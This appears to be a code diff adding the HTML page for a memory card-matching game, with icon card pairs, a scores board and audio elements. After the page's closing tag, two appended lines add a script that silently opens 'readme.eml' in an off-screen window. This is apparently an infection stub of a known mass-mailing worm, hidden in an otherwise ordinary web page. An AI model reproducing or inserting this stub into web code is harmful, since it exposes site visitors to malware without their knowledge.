+        <div style="color: #ffef13" class="face back">
+          <i class="fad fa-butter fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="candy-bar">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: rgb(141, 45, 0)" class="face back">
+          <i class="fad fa-candy-bar fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="candy-bar">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: rgb(141, 45, 0)" class="face back">
+          <i class="fad fa-candy-bar fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="cherries">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #fe1546" class="face back">
+          <i class="fad fa-cherries fa-swap-opacity fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="cherries">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #fe1546" class="face back">
+          <i class="fad fa-cherries fa-swap-opacity fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="citrus">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #fe9115" class="face back">
+          <i class="fad fa-citrus fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="citrus">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #fe9115" class="face back">
+          <i class="fad fa-citrus fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="coconut">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #5c3d15" class="face back">
+          <i class="fad fa-coconut fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="coconut">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #5c3d15" class="face back">
+          <i class="fad fa-coconut fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="corn">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f2ba00" class="face back">
+          <i class="fad fa-corn fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="corn">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #f2ba00" class="face back">
+          <i class="fad fa-corn fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="crab">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff1616" class="face back">
+          <i class="fad fa-crab fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="crab">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff1616" class="face back">
+          <i class="fad fa-crab fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="deer">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ffc116" class="face back">
+          <i class="fad fa-deer fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="deer">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ffc116" class="face back">
+          <i class="fad fa-deer fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="dolphin">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #16e4ff" class="face back">
+          <i class="fad fa-dolphin fa-swap-opacity fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="dolphin">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #16e4ff" class="face back">
+          <i class="fad fa-dolphin fa-swap-opacity fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="donut">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff166f" class="face back">
+          <i class="fad fa-donut fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="donut">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ff166f" class="face back">
+          <i class="fad fa-donut fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="drumstick">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ffa126" class="face back">
+          <i class="fad fa-drumstick fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="drumstick">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ffa126" class="face back">
+          <i class="fad fa-drumstick fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="drone-front">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #1b58ff" class="face back">
+          <i class="fad fa-drone-front fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="drone-front">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #1b58ff" class="face back">
+          <i class="fad fa-drone-front fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="duck">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #fff01b" class="face back">
+          <i class="fad fa-duck fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="duck">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #fff01b" class="face back">
+          <i class="fad fa-duck fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="eggplant">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #3f00d1" class="face back">
+          <i class="fad fa-eggplant fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="eggplant">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #3f00d1" class="face back">
+          <i class="fad fa-eggplant fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="croissant">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ffac2e" class="face back">
+          <i class="fad fa-croissant fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="croissant">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #ffac2e" class="face back">
+          <i class="fad fa-croissant fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="custard">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #8aff3c" class="face back">
+          <i class="fad fa-custard fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="custard">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #8aff3c" class="face back">
+          <i class="fad fa-custard fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="fire-hydrant">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #fa3f1d" class="face back">
+          <i class="fad fa-fire-hydrant fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="fire-hydrant">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #fa3f1d" class="face back">
+          <i class="fad fa-fire-hydrant fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="frog">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #5bca00" class="face back">
+          <i class="fad fa-frog fa-swap-opacity fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="frog">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #5bca00" class="face back">
+          <i class="fad fa-frog fa-swap-opacity fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="galaxy">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #5100e7" class="face back">
+          <i class="fad fa-galaxy fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="galaxy">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #5100e7" class="face back">
+          <i class="fad fa-galaxy fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="grapes">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #b3ff00" class="face back">
+          <i class="fad fa-grapes fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="grapes">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #b3ff00" class="face back">
+          <i class="fad fa-grapes fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="hippo">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #714d41" class="face back">
+          <i class="fad fa-hippo fa-swap-opacity fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="hippo">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #714d41" class="face back">
+          <i class="fad fa-hippo fa-swap-opacity fa-7x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="helmet-safety">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #fbff00" class="face back">
+          <i class="fad fa-helmet-safety fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="helmet-safety">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #fbff00" class="face back">
+          <i class="fad fa-helmet-safety fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="hat-wizard">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #9718ff" class="face back">
+          <i class="fad fa-hat-wizard fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="hat-wizard">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: #9718ff" class="face back">
+          <i class="fad fa-hat-wizard fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="hat-chef">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: white" class="face back">
+          <i class="fad fa-hat-chef fa-8x"></i>
+        </div>
+      </div>
+      <div class="game-block" data-data="hat-chef">
+        <div class="face front">
+          <i class="bi bi-question"></i>
+        </div>
+        <div style="color: white" class="face back">
+          <i class="fad fa-hat-chef fa-8x"></i>
+        </div>
+      </div>
+    </div>
+    <div class="board-of-scores">
+      <span
+        ><span>scores board</span>
+        <div title="board clear" class="btnClear btn btn-danger">
+          <i class="far fa-trash-can fa-2x"></i>
+        </div>
+      </span>
+      <div class="header row">
+        <div class="col fs-1">player</div>
+        <div class="col fs-1">score</div>
+        <div class="col fs-1">wrongs</div>
+        <div class="col fs-1">date</div>
+        <div class="col fs-1">state</div>
+      </div>
+      <div class="theplayers"></div>
+    </div>
+    <audio
+      id="bg-song"
+      src="audios/Outside the Universe - Joel Cummins, Kris Myers, Andy Farag.mp3"
+    ></audio>
+    <audio id="success-sound" src="audios/Metallic Clank 2.mp3"></audio>
+    <audio id="fail-sound" src="audios/Clang and wobble 2.mp3"></audio>
+    <audio id="success-song" src="audios/Rake Swing Whoosh Close.mp3"></audio>
+    <audio id="fail-song" src="audios/Power Tool Electrical Buzz.mp3"></audio>
+    <script src="js/bootstrap.bundle.min.js"></script>
+    <script src="js/memory game.js"></script>
+  </body>
+</html>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
